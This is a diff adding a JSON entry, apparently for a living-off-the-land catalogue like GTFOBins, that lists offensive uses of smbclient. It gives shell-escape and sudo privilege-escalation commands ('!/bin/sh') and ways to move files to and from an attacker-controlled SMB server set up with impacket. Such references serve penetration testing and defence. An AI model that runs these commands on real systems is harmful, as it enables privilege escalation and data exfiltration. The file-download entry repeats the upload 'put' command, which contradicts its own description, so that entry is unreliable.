@@ -1,0 +1,27 @@
+{
+  "description": "A valid SMB/CIFS server must be available.",
+  "functions": {
+    "shell": [
+      {
+        "code": "smbclient '\\\\[host]\\share'\n!/bin/sh\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Install 'https://github.com/SecureAuthCorp/impacket' and run 'sudo smbserver.py share /tmp' on the attacker box to collect the file.",
+        "code": "smbclient '\\\\[host]\\share' -c 'put [source_file] [destination_file]'\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Install 'https://github.com/SecureAuthCorp/impacket' and run 'sudo smbserver.py share /tmp' on the attacker box to send the file.",
+        "code": "smbclient '\\\\[host]\\share' -c 'put [source_file] [destination_file]'\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "sudo smbclient '\\\\[host]\\share'\n!/bin/sh\n"
+      }
+    ]
+  }
+}
